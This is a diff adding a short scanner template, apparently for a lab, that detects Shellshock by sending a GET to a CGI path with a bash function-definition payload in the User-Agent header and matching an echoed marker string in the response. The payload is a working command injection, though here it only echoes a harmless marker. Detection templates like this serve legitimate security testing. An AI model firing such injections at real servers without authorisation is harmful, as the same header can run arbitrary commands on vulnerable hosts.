@@ -1,0 +1,17 @@
+id: lab3-shellshock-detect
+info:
+  name: Lab3 Shellshock detector
+  author: me
+  severity: critical
+  description: Lab3 Shellshock detector
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/vulnerable"
+    headers:
+      User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo IDDQD+IDKFA+IDCLIP'
+    matchers:
+      - type: word
+        words:
+          - "IDDQD+IDKFA+IDCLIP"
+        part: body
